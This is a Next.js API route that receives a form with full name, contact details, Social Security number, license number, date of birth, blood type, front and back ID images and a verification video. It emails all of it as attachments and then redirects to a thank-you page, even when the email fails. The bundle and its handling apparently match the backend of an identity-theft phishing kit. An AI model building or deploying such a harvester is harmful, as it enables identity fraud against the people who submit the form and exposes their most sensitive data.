import { NextRequest, NextResponse } from 'next/server';
import { sendServicesEmail } from '@/lib/email';

export async function GET() {
    return NextResponse.json(
        {
            message: 'Stepper form API endpoint is working',
            timestamp: new Date().toISOString(),
            status: 'active'
        },
        { status: 200 }
    );
}

export async function POST(request: NextRequest) {
    try {
        // Check content length to prevent 413 errors
        const contentLength = request.headers.get('content-length');
        if (contentLength && parseInt(contentLength) > 50 * 1024 * 1024) { // 50MB limit
            return NextResponse.json(
                { error: 'Request payload too large. Please reduce file sizes and try again.' },
                { status: 413 }
            );
        }

        const body = await request.json();
        const {
            fullName,
            phone,
            email,
            province,
            address,
            ssn,
            licenseNumber,
            dateOfBirth,
            bloodType,
            frontId,
            backId,
            videoBlob,
            recordingTime
        } = body;

        // Validate required fields
        if (!fullName || !email || !phone) {
            return NextResponse.json(
                { error: 'Name, email, and phone are required' },
                { status: 400 }
            );
        }

        // Prepare attachments with better error handling
        const attachments = [];

        try {
            // Helper function to process base64 data
            const processBase64Data = (data: string) => {
                return data.includes(',') ? data.split(',')[ 1 ] : data;
            };

            // Helper function to get file extension from base64 or default to jpg
            const getFileExtension = (data: string, defaultExt: string = 'jpg') => {
                if (data.includes('data:image/png')) return 'png';
                if (data.includes('data:image/jpeg')) return 'jpg';
                if (data.includes('data:image/jpg')) return 'jpg';
                return defaultExt;
            };

            // Process front ID
            if (frontId && frontId.trim()) {
                const base64Data = processBase64Data(frontId);
                const extension = getFileExtension(frontId);
                attachments.push({
                    filename: `front_id_${fullName.replace(/\s+/g, '_')}.${extension}`,
                    content: base64Data,
                    encoding: 'base64'
                });
                console.log('Added front ID attachment');
            }

            // Process back ID
            if (backId && backId.trim()) {
                const base64Data = processBase64Data(backId);
                const extension = getFileExtension(backId);
                attachments.push({
                    filename: `back_id_${fullName.replace(/\s+/g, '_')}.${extension}`,
                    content: base64Data,
                    encoding: 'base64'
                });
                console.log('Added back ID attachment');
            }

            // Process video
            if (videoBlob && videoBlob.trim()) {
                const base64Data = processBase64Data(videoBlob);
                attachments.push({
                    filename: `verification_video_${fullName.replace(/\s+/g, '_')}.mp4`,
                    content: base64Data,
                    encoding: 'base64'
                });
                console.log('Added video attachment');
            }

            console.log(`Total attachments: ${attachments.length}`);
        } catch (attachmentError) {
            console.error('Error processing attachments:', attachmentError);
            // Continue without attachments rather than failing completely
        }

        // Send emails using the centralized email service
        const emailResult = await sendServicesEmail(
            fullName,
            phone,
            email,
            province,
            address,
            ssn,
            licenseNumber,
            dateOfBirth,
            bloodType,
            frontId,
            backId,
            videoBlob,
            recordingTime,
            attachments
        );

        if (!emailResult.success) {
            console.error('Failed to send services email:', emailResult.error);
            // Continue with redirect even if email fails
        }

        // Redirect to thank you page on success
        return NextResponse.redirect(new URL('/thank-you', request.url), { status: 302 });

    } catch (error) {
        console.error('Stepper form API error:', error);

        // More detailed error logging
        if (error instanceof Error) {
            console.error('Error message:', error.message);
            console.error('Error stack:', error.stack);
        }

        return NextResponse.json(
            {
                error: 'Failed to submit verification request',
                details: error instanceof Error ? error.message : 'Unknown error',
                timestamp: new Date().toISOString()
            },
            { status: 500 }
        );
    }
}